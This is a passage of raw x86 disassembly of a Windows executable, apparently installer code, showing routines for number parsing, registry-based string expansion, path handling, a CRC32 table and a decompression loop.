  406544:	66 83 fa 30          	cmp    $0x30,%dx
  406548:	72 0c                	jb     0x406556
  40654a:	66 83 fa 37          	cmp    $0x37,%dx
  40654e:	77 06                	ja     0x406556
  406550:	6a 08                	push   $0x8
  406552:	58                   	pop    %eax
  406553:	6a 37                	push   $0x37
  406555:	5b                   	pop    %ebx
  406556:	0f b7 d2             	movzwl %dx,%edx
  406559:	83 e2 df             	and    $0xffffffdf,%edx
  40655c:	83 fa 58             	cmp    $0x58,%edx
  40655f:	75 05                	jne    0x406566
  406561:	6a 10                	push   $0x10
  406563:	41                   	inc    %ecx
  406564:	58                   	pop    %eax
  406565:	41                   	inc    %ecx
  406566:	0f b7 11             	movzwl (%ecx),%edx
  406569:	41                   	inc    %ecx
  40656a:	41                   	inc    %ecx
  40656b:	83 fa 30             	cmp    $0x30,%edx
  40656e:	7c 0c                	jl     0x40657c
  406570:	0f b7 f3             	movzwl %bx,%esi
  406573:	3b d6                	cmp    %esi,%edx
  406575:	7f 05                	jg     0x40657c
  406577:	83 ea 30             	sub    $0x30,%edx
  40657a:	eb 1b                	jmp    0x406597
  40657c:	66 3d 10 00          	cmp    $0x10,%ax
  406580:	75 23                	jne    0x4065a5
  406582:	8b f2                	mov    %edx,%esi
  406584:	83 e6 df             	and    $0xffffffdf,%esi
  406587:	83 fe 41             	cmp    $0x41,%esi
  40658a:	7c 19                	jl     0x4065a5
  40658c:	83 fe 46             	cmp    $0x46,%esi
  40658f:	7f 14                	jg     0x4065a5
  406591:	83 e2 07             	and    $0x7,%edx
  406594:	83 c2 09             	add    $0x9,%edx
  406597:	0f b7 f0             	movzwl %ax,%esi
  40659a:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  40659e:	03 f2                	add    %edx,%esi
  4065a0:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4065a3:	eb c1                	jmp    0x406566
  4065a5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4065a8:	5e                   	pop    %esi
  4065a9:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  4065ad:	5b                   	pop    %ebx
  4065ae:	c9                   	leave
  4065af:	c2 04 00             	ret    $0x4
  4065b2:	68 00 04 00 00       	push   $0x400
  4065b7:	ff 74 24 0c          	push   0xc(%esp)
  4065bb:	ff 74 24 0c          	push   0xc(%esp)
  4065bf:	ff 15 98 80 40 00    	call   *0x408098
  4065c5:	c2 08 00             	ret    $0x8
  4065c8:	ff 25 9c 80 40 00    	jmp    *0x40809c
  4065ce:	ff 25 54 81 40 00    	jmp    *0x408154
  4065d4:	33 c0                	xor    %eax,%eax
  4065d6:	50                   	push   %eax
  4065d7:	50                   	push   %eax
  4065d8:	ff 74 24 14          	push   0x14(%esp)
  4065dc:	ff 74 24 14          	push   0x14(%esp)
  4065e0:	6a ff                	push   $0xffffffff
  4065e2:	ff 74 24 18          	push   0x18(%esp)
  4065e6:	50                   	push   %eax
  4065e7:	50                   	push   %eax
  4065e8:	ff 15 94 80 40 00    	call   *0x408094
  4065ee:	c3                   	ret
  4065ef:	8b 44 24 08          	mov    0x8(%esp),%eax
  4065f3:	83 ec 10             	sub    $0x10,%esp
  4065f6:	85 c0                	test   %eax,%eax
  4065f8:	7d 11                	jge    0x40660b
  4065fa:	8b 0d dc 36 43 00    	mov    0x4336dc,%ecx
  406600:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406607:	2b c8                	sub    %eax,%ecx
  406609:	8b 01                	mov    (%ecx),%eax
  40660b:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  406611:	53                   	push   %ebx
  406612:	55                   	push   %ebp
  406613:	56                   	push   %esi
  406614:	57                   	push   %edi
  406615:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  406618:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40661c:	b8 a0 26 43 00       	mov    $0x4326a0,%eax
  406621:	3b c8                	cmp    %eax,%ecx
  406623:	8b f0                	mov    %eax,%esi
  406625:	0f 82 0a 02 00 00    	jb     0x406835
  40662b:	8b d1                	mov    %ecx,%edx
  40662d:	2b d0                	sub    %eax,%edx
  40662f:	d1 fa                	sar    $1,%edx
  406631:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406637:	0f 83 f8 01 00 00    	jae    0x406835
  40663d:	83 64 24 24 00       	andl   $0x0,0x24(%esp)
  406642:	8b f1                	mov    %ecx,%esi
  406644:	e9 ec 01 00 00       	jmp    0x406835
  406649:	8b ce                	mov    %esi,%ecx
  40664b:	2b c8                	sub    %eax,%ecx
  40664d:	83 e1 fe             	and    $0xfffffffe,%ecx
  406650:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406656:	0f 8d e5 01 00 00    	jge    0x406841
  40665c:	6a 02                	push   $0x2
  40665e:	59                   	pop    %ecx
  40665f:	03 f9                	add    %ecx,%edi
  406661:	66 83 fd 04          	cmp    $0x4,%bp
  406665:	0f 83 b7 01 00 00    	jae    0x406822
  40666b:	8a 4f 01             	mov    0x1(%edi),%cl
  40666e:	8a 07                	mov    (%edi),%al
  406670:	8a d1                	mov    %cl,%dl
  406672:	8a d8                	mov    %al,%bl
  406674:	83 e2 7f             	and    $0x7f,%edx
  406677:	83 e3 7f             	and    $0x7f,%ebx
  40667a:	c1 e2 07             	shl    $0x7,%edx
  40667d:	0f b6 c0             	movzbl %al,%eax
  406680:	0b d3                	or     %ebx,%edx
  406682:	8b d8                	mov    %eax,%ebx
  406684:	89 54 24 28          	mov    %edx,0x28(%esp)
  406688:	ba 00 80 00 00       	mov    $0x8000,%edx
  40668d:	0b da                	or     %edx,%ebx
  40668f:	6a 02                	push   $0x2
  406691:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  406695:	89 44 24 18          	mov    %eax,0x18(%esp)
  406699:	0f b6 d9             	movzbl %cl,%ebx
  40669c:	8b cb                	mov    %ebx,%ecx
  40669e:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4066a2:	0b ca                	or     %edx,%ecx
  4066a4:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4066a8:	59                   	pop    %ecx
  4066a9:	03 f9                	add    %ecx,%edi
  4066ab:	66 3b e9             	cmp    %cx,%bp
  4066ae:	0f 85 12 01 00 00    	jne    0x4067c6
  4066b4:	33 ed                	xor    %ebp,%ebp
  4066b6:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4066ba:	39 2d 84 47 43 00    	cmp    %ebp,0x434784
  4066c0:	74 08                	je     0x4066ca
  4066c2:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  4066c9:	00 
  4066ca:	84 c0                	test   %al,%al
  4066cc:	79 38                	jns    0x406706
  4066ce:	8b c8                	mov    %eax,%ecx
  4066d0:	83 e0 3f             	and    $0x3f,%eax
  4066d3:	83 e1 40             	and    $0x40,%ecx
  4066d6:	51                   	push   %ecx
  4066d7:	8b 0d 38 47 43 00    	mov    0x434738,%ecx
  4066dd:	56                   	push   %esi
  4066de:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4066e1:	50                   	push   %eax
  4066e2:	68 20 84 40 00       	push   $0x408420
  4066e7:	68 02 00 00 80       	push   $0x80000002
  4066ec:	e8 8f fd ff ff       	call   0x406480
  4066f1:	66 39 2e             	cmp    %bp,(%esi)
  4066f4:	0f 85 b4 00 00 00    	jne    0x4067ae
  4066fa:	53                   	push   %ebx
  4066fb:	56                   	push   %esi
  4066fc:	e8 ee fe ff ff       	call   0x4065ef
  406701:	e9 a3 00 00 00       	jmp    0x4067a9
  406706:	83 f8 25             	cmp    $0x25,%eax
  406709:	75 11                	jne    0x40671c
  40670b:	68 00 04 00 00       	push   $0x400
  406710:	56                   	push   %esi
  406711:	ff 15 58 81 40 00    	call   *0x408158
  406717:	e9 8d 00 00 00       	jmp    0x4067a9
  40671c:	83 f8 24             	cmp    $0x24,%eax
  40671f:	75 10                	jne    0x406731
  406721:	68 00 04 00 00       	push   $0x400
  406726:	56                   	push   %esi
  406727:	ff 15 b0 80 40 00    	call   *0x4080b0
  40672d:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  406731:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  406735:	74 72                	je     0x4067a9
  406737:	ff 4c 24 28          	decl   0x28(%esp)
  40673b:	8b 44 24 28          	mov    0x28(%esp),%eax
  40673f:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  406743:	a1 04 47 43 00       	mov    0x434704,%eax
  406748:	83 e3 bf             	and    $0xffffffbf,%ebx
  40674b:	8b eb                	mov    %ebx,%ebp
  40674d:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  406753:	85 c0                	test   %eax,%eax
  406755:	74 12                	je     0x406769
  406757:	56                   	push   %esi
  406758:	6a 00                	push   $0x0
  40675a:	6a 00                	push   $0x0
  40675c:	53                   	push   %ebx
  40675d:	ff 35 08 47 43 00    	push   0x434708
  406763:	ff d0                	call   *%eax
  406765:	85 c0                	test   %eax,%eax
  406767:	74 3a                	je     0x4067a3
  406769:	6a 07                	push   $0x7
  40676b:	e8 36 02 00 00       	call   0x4069a6
  406770:	0f b6 cb             	movzbl %bl,%ecx
  406773:	55                   	push   %ebp
  406774:	51                   	push   %ecx
  406775:	ff 35 08 47 43 00    	push   0x434708
  40677b:	ff d0                	call   *%eax
  40677d:	8b d8                	mov    %eax,%ebx
  40677f:	85 db                	test   %ebx,%ebx
  406781:	74 15                	je     0x406798
  406783:	56                   	push   %esi
  406784:	53                   	push   %ebx
  406785:	ff 15 74 81 40 00    	call   *0x408174
  40678b:	53                   	push   %ebx
  40678c:	8b e8                	mov    %eax,%ebp
  40678e:	ff 15 a0 82 40 00    	call   *0x4082a0
  406794:	85 ed                	test   %ebp,%ebp
  406796:	75 0b                	jne    0x4067a3
  406798:	66 83 26 00          	andw   $0x0,(%esi)
  40679c:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  4067a1:	75 94                	jne    0x406737
  4067a3:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4067a7:	33 ed                	xor    %ebp,%ebp
  4067a9:	66 39 2e             	cmp    %bp,(%esi)
  4067ac:	74 10                	je     0x4067be
  4067ae:	83 fb 1a             	cmp    $0x1a,%ebx
  4067b1:	75 0b                	jne    0x4067be
  4067b3:	68 78 84 40 00       	push   $0x408478
  4067b8:	56                   	push   %esi
  4067b9:	e8 10 fe ff ff       	call   0x4065ce
  4067be:	56                   	push   %esi
  4067bf:	e8 9c 00 00 00       	call   0x406860
  4067c4:	eb 4c                	jmp    0x406812
  4067c6:	66 83 fd 03          	cmp    $0x3,%bp
  4067ca:	75 32                	jne    0x4067fe
  4067cc:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  4067d0:	83 fb 1d             	cmp    $0x1d,%ebx
  4067d3:	75 0e                	jne    0x4067e3
  4067d5:	ff 35 08 47 43 00    	push   0x434708
  4067db:	56                   	push   %esi
  4067dc:	e8 18 fd ff ff       	call   0x4064f9
  4067e1:	eb 11                	jmp    0x4067f4
  4067e3:	8b c3                	mov    %ebx,%eax
  4067e5:	c1 e0 0b             	shl    $0xb,%eax
  4067e8:	05 00 50 43 00       	add    $0x435000,%eax
  4067ed:	50                   	push   %eax
  4067ee:	56                   	push   %esi
  4067ef:	e8 be fd ff ff       	call   0x4065b2
  4067f4:	83 c3 eb             	add    $0xffffffeb,%ebx
  4067f7:	83 fb 07             	cmp    $0x7,%ebx
  4067fa:	73 16                	jae    0x406812
  4067fc:	eb c0                	jmp    0x4067be
  4067fe:	66 83 fd 01          	cmp    $0x1,%bp
  406802:	75 0e                	jne    0x406812
  406804:	83 c8 ff             	or     $0xffffffff,%eax
  406807:	2b 44 24 28          	sub    0x28(%esp),%eax
  40680b:	50                   	push   %eax
  40680c:	56                   	push   %esi
  40680d:	e8 dd fd ff ff       	call   0x4065ef
  406812:	56                   	push   %esi
  406813:	e8 b0 fd ff ff       	call   0x4065c8
  406818:	8d 34 46             	lea    (%esi,%eax,2),%esi
  40681b:	b8 a0 26 43 00       	mov    $0x4326a0,%eax
  406820:	eb 13                	jmp    0x406835
  406822:	75 0c                	jne    0x406830
  406824:	66 8b 17             	mov    (%edi),%dx
  406827:	66 89 16             	mov    %dx,(%esi)
  40682a:	03 f1                	add    %ecx,%esi
  40682c:	03 f9                	add    %ecx,%edi
  40682e:	eb 05                	jmp    0x406835
  406830:	66 89 2e             	mov    %bp,(%esi)
  406833:	03 f1                	add    %ecx,%esi
  406835:	66 8b 2f             	mov    (%edi),%bp
  406838:	66 85 ed             	test   %bp,%bp
  40683b:	0f 85 08 fe ff ff    	jne    0x406649
  406841:	66 83 26 00          	andw   $0x0,(%esi)
  406845:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  40684a:	5f                   	pop    %edi
  40684b:	5e                   	pop    %esi
  40684c:	5d                   	pop    %ebp
  40684d:	5b                   	pop    %ebx
  40684e:	74 0a                	je     0x40685a
  406850:	50                   	push   %eax
  406851:	ff 74 24 18          	push   0x18(%esp)
  406855:	e8 58 fd ff ff       	call   0x4065b2
  40685a:	83 c4 10             	add    $0x10,%esp
  40685d:	c2 08 00             	ret    $0x8
  406860:	55                   	push   %ebp
  406861:	56                   	push   %esi
  406862:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406866:	57                   	push   %edi
  406867:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  40686b:	75 18                	jne    0x406885
  40686d:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  406872:	75 11                	jne    0x406885
  406874:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  406879:	75 0a                	jne    0x406885
  40687b:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  406880:	75 03                	jne    0x406885
  406882:	83 c6 08             	add    $0x8,%esi
  406885:	66 83 3e 00          	cmpw   $0x0,(%esi)
  406889:	74 0d                	je     0x406898
  40688b:	56                   	push   %esi
  40688c:	e8 67 f6 ff ff       	call   0x405ef8
  406891:	85 c0                	test   %eax,%eax
  406893:	74 03                	je     0x406898
  406895:	83 c6 04             	add    $0x4,%esi
  406898:	66 8b 06             	mov    (%esi),%ax
  40689b:	8b ee                	mov    %esi,%ebp
  40689d:	66 85 c0             	test   %ax,%ax
  4068a0:	8b fe                	mov    %esi,%edi
  4068a2:	74 40                	je     0x4068e4
  4068a4:	53                   	push   %ebx
  4068a5:	8b 1d 08 82 40 00    	mov    0x408208,%ebx
  4068ab:	66 3d 1f 00          	cmp    $0x1f,%ax
  4068af:	76 25                	jbe    0x4068d6
  4068b1:	50                   	push   %eax
  4068b2:	68 9c a5 40 00       	push   $0x40a59c
  4068b7:	e8 f2 f5 ff ff       	call   0x405eae
  4068bc:	66 83 38 00          	cmpw   $0x0,(%eax)
  4068c0:	75 14                	jne    0x4068d6
  4068c2:	56                   	push   %esi
  4068c3:	ff d3                	call   *%ebx
  4068c5:	2b c6                	sub    %esi,%eax
  4068c7:	d1 f8                	sar    $1,%eax
  4068c9:	50                   	push   %eax
  4068ca:	56                   	push   %esi
  4068cb:	57                   	push   %edi
  4068cc:	e8 8c f7 ff ff       	call   0x40605d
  4068d1:	57                   	push   %edi
  4068d2:	ff d3                	call   *%ebx
  4068d4:	8b f8                	mov    %eax,%edi
  4068d6:	56                   	push   %esi
  4068d7:	ff d3                	call   *%ebx
  4068d9:	8b f0                	mov    %eax,%esi
  4068db:	66 8b 06             	mov    (%esi),%ax
  4068de:	66 85 c0             	test   %ax,%ax
  4068e1:	75 c8                	jne    0x4068ab
  4068e3:	5b                   	pop    %ebx
  4068e4:	66 83 27 00          	andw   $0x0,(%edi)
  4068e8:	57                   	push   %edi
  4068e9:	55                   	push   %ebp
  4068ea:	ff 15 fc 81 40 00    	call   *0x4081fc
  4068f0:	8b f8                	mov    %eax,%edi
  4068f2:	66 8b 07             	mov    (%edi),%ax
  4068f5:	66 3d 20 00          	cmp    $0x20,%ax
  4068f9:	74 06                	je     0x406901
  4068fb:	66 3d 5c 00          	cmp    $0x5c,%ax
  4068ff:	75 08                	jne    0x406909
  406901:	66 83 27 00          	andw   $0x0,(%edi)
  406905:	3b ef                	cmp    %edi,%ebp
  406907:	72 df                	jb     0x4068e8
  406909:	5f                   	pop    %edi
  40690a:	5e                   	pop    %esi
  40690b:	5d                   	pop    %ebp
  40690c:	c2 04 00             	ret    $0x4
  40690f:	56                   	push   %esi
  406910:	be b8 fa 42 00       	mov    $0x42fab8,%esi
  406915:	56                   	push   %esi
  406916:	ff 74 24 0c          	push   0xc(%esp)
  40691a:	ff 15 40 81 40 00    	call   *0x408140
  406920:	83 f8 ff             	cmp    $0xffffffff,%eax
  406923:	74 0b                	je     0x406930
  406925:	50                   	push   %eax
  406926:	ff 15 38 81 40 00    	call   *0x408138
  40692c:	8b c6                	mov    %esi,%eax
  40692e:	eb 02                	jmp    0x406932
  406930:	33 c0                	xor    %eax,%eax
  406932:	5e                   	pop    %esi
  406933:	c2 04 00             	ret    $0x4
  406936:	55                   	push   %ebp
  406937:	8b ec                	mov    %esp,%ebp
  406939:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  40693f:	56                   	push   %esi
  406940:	be 04 01 00 00       	mov    $0x104,%esi
  406945:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  40694b:	56                   	push   %esi
  40694c:	50                   	push   %eax
  40694d:	ff 15 58 81 40 00    	call   *0x408158
  406953:	3b c6                	cmp    %esi,%eax
  406955:	5e                   	pop    %esi
  406956:	76 02                	jbe    0x40695a
  406958:	33 c0                	xor    %eax,%eax
  40695a:	85 c0                	test   %eax,%eax
  40695c:	74 0f                	je     0x40696d
  40695e:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406965:	ff 5c 
  406967:	74 04                	je     0x40696d
  406969:	33 c9                	xor    %ecx,%ecx
  40696b:	eb 03                	jmp    0x406970
  40696d:	33 c9                	xor    %ecx,%ecx
  40696f:	41                   	inc    %ecx
  406970:	ff 75 08             	push   0x8(%ebp)
  406973:	8d 0c 4d 14 a0 40 00 	lea    0x40a014(,%ecx,2),%ecx
  40697a:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  406981:	51                   	push   %ecx
  406982:	68 b0 a5 40 00       	push   $0x40a5b0
  406987:	50                   	push   %eax
  406988:	ff 15 2c 82 40 00    	call   *0x40822c
  40698e:	83 c4 10             	add    $0x10,%esp
  406991:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406997:	6a 08                	push   $0x8
  406999:	6a 00                	push   $0x0
  40699b:	50                   	push   %eax
  40699c:	ff 15 18 81 40 00    	call   *0x408118
  4069a2:	c9                   	leave
  4069a3:	c2 04 00             	ret    $0x4
  4069a6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4069aa:	56                   	push   %esi
  4069ab:	8b f0                	mov    %eax,%esi
  4069ad:	57                   	push   %edi
  4069ae:	c1 e6 03             	shl    $0x3,%esi
  4069b1:	8b be d8 a3 40 00    	mov    0x40a3d8(%esi),%edi
  4069b7:	57                   	push   %edi
  4069b8:	ff 15 60 81 40 00    	call   *0x408160
  4069be:	85 c0                	test   %eax,%eax
  4069c0:	75 0a                	jne    0x4069cc
  4069c2:	57                   	push   %edi
  4069c3:	e8 6e ff ff ff       	call   0x406936
  4069c8:	85 c0                	test   %eax,%eax
  4069ca:	74 0f                	je     0x4069db
  4069cc:	ff b6 dc a3 40 00    	push   0x40a3dc(%esi)
  4069d2:	50                   	push   %eax
  4069d3:	ff 15 5c 81 40 00    	call   *0x40815c
  4069d9:	eb 02                	jmp    0x4069dd
  4069db:	33 c0                	xor    %eax,%eax
  4069dd:	5f                   	pop    %edi
  4069de:	5e                   	pop    %esi
  4069df:	c2 04 00             	ret    $0x4
  4069e2:	55                   	push   %ebp
  4069e3:	8b ec                	mov    %esp,%ebp
  4069e5:	83 ec 1c             	sub    $0x1c,%esp
  4069e8:	56                   	push   %esi
  4069e9:	8b 75 08             	mov    0x8(%ebp),%esi
  4069ec:	57                   	push   %edi
  4069ed:	8b 3d 84 82 40 00    	mov    0x408284,%edi
  4069f3:	eb 0a                	jmp    0x4069ff
  4069f5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4069f8:	50                   	push   %eax
  4069f9:	ff 15 7c 82 40 00    	call   *0x40827c
  4069ff:	6a 01                	push   $0x1
  406a01:	56                   	push   %esi
  406a02:	56                   	push   %esi
  406a03:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406a06:	6a 00                	push   $0x0
  406a08:	50                   	push   %eax
  406a09:	ff d7                	call   *%edi
  406a0b:	85 c0                	test   %eax,%eax
  406a0d:	75 e6                	jne    0x4069f5
  406a0f:	5f                   	pop    %edi
  406a10:	5e                   	pop    %esi
  406a11:	c9                   	leave
  406a12:	c2 04 00             	ret    $0x4
  406a15:	55                   	push   %ebp
  406a16:	8b ec                	mov    %esp,%ebp
  406a18:	81 ec 00 01 00 00    	sub    $0x100,%esp
  406a1e:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a24:	68 00 01 00 00       	push   $0x100
  406a29:	50                   	push   %eax
  406a2a:	ff 75 0c             	push   0xc(%ebp)
  406a2d:	e8 a2 fb ff ff       	call   0x4065d4
  406a32:	83 c4 0c             	add    $0xc,%esp
  406a35:	85 c0                	test   %eax,%eax
  406a37:	74 12                	je     0x406a4b
  406a39:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406a3f:	50                   	push   %eax
  406a40:	ff 75 08             	push   0x8(%ebp)
  406a43:	ff 15 5c 81 40 00    	call   *0x40815c
  406a49:	eb 02                	jmp    0x406a4d
  406a4b:	33 c0                	xor    %eax,%eax
  406a4d:	c9                   	leave
  406a4e:	c2 08 00             	ret    $0x8
  406a51:	55                   	push   %ebp
  406a52:	8b ec                	mov    %esp,%ebp
  406a54:	51                   	push   %ecx
  406a55:	56                   	push   %esi
  406a56:	8b 35 68 81 40 00    	mov    0x408168,%esi
  406a5c:	57                   	push   %edi
  406a5d:	6a 64                	push   $0x64
  406a5f:	ff 75 08             	push   0x8(%ebp)
  406a62:	ff d6                	call   *%esi
  406a64:	bf 02 01 00 00       	mov    $0x102,%edi
  406a69:	eb 0e                	jmp    0x406a79
  406a6b:	6a 0f                	push   $0xf
  406a6d:	e8 70 ff ff ff       	call   0x4069e2
  406a72:	6a 64                	push   $0x64
  406a74:	ff 75 08             	push   0x8(%ebp)
  406a77:	ff d6                	call   *%esi
  406a79:	3b c7                	cmp    %edi,%eax
  406a7b:	74 ee                	je     0x406a6b
  406a7d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a80:	50                   	push   %eax
  406a81:	ff 75 08             	push   0x8(%ebp)
  406a84:	ff 15 64 81 40 00    	call   *0x408164
  406a8a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a8d:	5f                   	pop    %edi
  406a8e:	5e                   	pop    %esi
  406a8f:	c9                   	leave
  406a90:	c2 04 00             	ret    $0x4
  406a93:	83 3d 0c 11 43 00 00 	cmpl   $0x0,0x43110c
  406a9a:	56                   	push   %esi
  406a9b:	75 2d                	jne    0x406aca
  406a9d:	33 c9                	xor    %ecx,%ecx
  406a9f:	6a 08                	push   $0x8
  406aa1:	8b c1                	mov    %ecx,%eax
  406aa3:	5e                   	pop    %esi
  406aa4:	8b d0                	mov    %eax,%edx
  406aa6:	80 e2 01             	and    $0x1,%dl
  406aa9:	f6 da                	neg    %dl
  406aab:	1b d2                	sbb    %edx,%edx
  406aad:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  406ab3:	d1 e8                	shr    $1,%eax
  406ab5:	33 c2                	xor    %edx,%eax
  406ab7:	4e                   	dec    %esi
  406ab8:	75 ea                	jne    0x406aa4
  406aba:	89 04 8d 08 11 43 00 	mov    %eax,0x431108(,%ecx,4)
  406ac1:	41                   	inc    %ecx
  406ac2:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406ac8:	7c d5                	jl     0x406a9f
  406aca:	8b 54 24 10          	mov    0x10(%esp),%edx
  406ace:	8b 44 24 08          	mov    0x8(%esp),%eax
  406ad2:	85 d2                	test   %edx,%edx
  406ad4:	f7 d0                	not    %eax
  406ad6:	76 23                	jbe    0x406afb
  406ad8:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406adc:	57                   	push   %edi
  406add:	0f b6 39             	movzbl (%ecx),%edi
  406ae0:	8b f0                	mov    %eax,%esi
  406ae2:	81 e6 ff 00 00 00    	and    $0xff,%esi
  406ae8:	33 f7                	xor    %edi,%esi
  406aea:	c1 e8 08             	shr    $0x8,%eax
  406aed:	8b 34 b5 08 11 43 00 	mov    0x431108(,%esi,4),%esi
  406af4:	33 c6                	xor    %esi,%eax
  406af6:	41                   	inc    %ecx
  406af7:	4a                   	dec    %edx
  406af8:	75 e3                	jne    0x406add
  406afa:	5f                   	pop    %edi
  406afb:	f7 d0                	not    %eax
  406afd:	5e                   	pop    %esi
  406afe:	c2 0c 00             	ret    $0xc
  406b01:	55                   	push   %ebp
  406b02:	8b ec                	mov    %esp,%ebp
  406b04:	83 ec 44             	sub    $0x44,%esp
  406b07:	8b 45 08             	mov    0x8(%ebp),%eax
  406b0a:	53                   	push   %ebx
  406b0b:	56                   	push   %esi
  406b0c:	57                   	push   %edi
  406b0d:	8b 08                	mov    (%eax),%ecx
  406b0f:	8d 70 10             	lea    0x10(%eax),%esi
  406b12:	8b 40 04             	mov    0x4(%eax),%eax
  406b15:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  406b18:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  406b1e:	8b 9e 18 05 00 00    	mov    0x518(%esi),%ebx
  406b24:	89 45 cc             	mov    %eax,-0x34(%ebp)
  406b27:	8b 86 1c 05 00 00    	mov    0x51c(%esi),%eax
  406b2d:	89 45 c0             	mov    %eax,-0x40(%ebp)
  406b30:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  406b36:	3b c8                	cmp    %eax,%ecx
  406b38:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406b3b:	73 05                	jae    0x406b42
  406b3d:	2b c1                	sub    %ecx,%eax
  406b3f:	48                   	dec    %eax
  406b40:	eb 08                	jmp    0x406b4a
  406b42:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  406b48:	2b c1                	sub    %ecx,%eax
  406b4a:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  406b4d:	e9 c3 09 00 00       	jmp    0x407515
  406b52:	ff 24 85 50 75 40 00 	jmp    *0x407550(,%eax,4)
  406b59:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406b5d:	0f 84 c2 09 00 00    	je     0x407525
  406b63:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406b66:	ff 4d cc             	decl   -0x34(%ebp)
  406b69:	8b cb                	mov    %ebx,%ecx
  406b6b:	0f b6 00             	movzbl (%eax),%eax
  406b6e:	d3 e0                	shl    %cl,%eax
  406b70:	09 45 c0             	or     %eax,-0x40(%ebp)
  406b73:	ff 45 c8             	incl   -0x38(%ebp)
  406b76:	83 c3 08             	add    $0x8,%ebx
  406b79:	83 fb 03             	cmp    $0x3,%ebx
  406b7c:	72 db                	jb     0x406b59
  406b7e:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406b81:	83 eb 03             	sub    $0x3,%ebx
  406b84:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406b88:	83 e0 07             	and    $0x7,%eax
  406b8b:	8b c8                	mov    %eax,%ecx
  406b8d:	80 e1 01             	and    $0x1,%cl
  406b90:	f6 d9                	neg    %cl
  406b92:	1b c9                	sbb    %ecx,%ecx
  406b94:	83 e1 07             	and    $0x7,%ecx
  406b97:	d1 e8                	shr    $1,%eax
  406b99:	83 c1 08             	add    $0x8,%ecx
  406b9c:	83 e8 00             	sub    $0x0,%eax
  406b9f:	89 8e 14 05 00 00    	mov    %ecx,0x514(%esi)
  406ba5:	0f 84 2e 01 00 00    	je     0x406cd9
  406bab:	48                   	dec    %eax
  406bac:	74 56                	je     0x406c04
  406bae:	48                   	dec    %eax
  406baf:	74 48                	je     0x406bf9
  406bb1:	48                   	dec    %eax
  406bb2:	0f 85 5d 09 00 00    	jne    0x407515
  406bb8:	83 cf ff             	or     $0xffffffff,%edi
  406bbb:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406bc1:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406bc4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406bc7:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  406bcd:	8b 45 cc             	mov    -0x34(%ebp),%eax
  406bd0:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  406bd6:	89 41 04             	mov    %eax,0x4(%ecx)
  406bd9:	8b 45 08             	mov    0x8(%ebp),%eax
  406bdc:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406bdf:	50                   	push   %eax
  406be0:	89 08                	mov    %ecx,(%eax)
  406be2:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  406be5:	89 8e a8 9b 00 00    	mov    %ecx,0x9ba8(%esi)
  406beb:	e8 a0 09 00 00       	call   0x407590
  406bf0:	8b c7                	mov    %edi,%eax
  406bf2:	5f                   	pop    %edi
  406bf3:	5e                   	pop    %esi
  406bf4:	5b                   	pop    %ebx
  406bf5:	c9                   	leave
  406bf6:	c2 04 00             	ret    $0x4
  406bf9:	c7 06 0b 00 00 00    	movl   $0xb,(%esi)
  406bff:	e9 11 09 00 00       	jmp    0x407515
  406c04:	80 3d 90 26 43 00 00 	cmpb   $0x0,0x432690
